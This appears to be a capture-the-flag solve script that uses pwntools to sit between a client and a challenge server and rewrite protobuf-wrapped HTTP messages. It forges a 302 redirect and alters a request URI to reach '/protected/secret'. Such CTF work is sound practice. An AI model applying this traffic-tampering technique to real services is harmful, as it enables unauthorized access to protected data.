from pwn import *
import sys
import struct
import binascii
import format_pb2
import md5
import re

context(arch='x86_64', os='linux')

conn = remote('ssl-added-and-removed-here.ctfcompetition.com', 13001, ssl=True)

def read_msg():
	length = u32(conn.recv(4))
	request = format_pb2.Exchange()
	data = conn.recv(length)
	request.ParseFromString(data)
	log.info("< %s" % request)
	return request

def send_msg(payload):
	log.info("> %s" % payload)
	data = payload.SerializeToString()
	output = p32(len(data)) + data
	conn.send(output)

# Request
i = read_msg()
send_msg(i)

# Response
i = read_msg()
i.reply.status = 302;
del i.reply.headers[:]
location = i.reply.headers.add()
location.key = "Location"
location.value = "/protected/secret"
send_msg(i)

# Request (w request info)
i = read_msg()
i.request.uri = "/protected/secret"
send_msg(i)

# Response (w token hopefully)
i = read_msg()
send_msg(i)


i = read_msg()
send_msg(i)

i = read_msg()
send_msg(i)
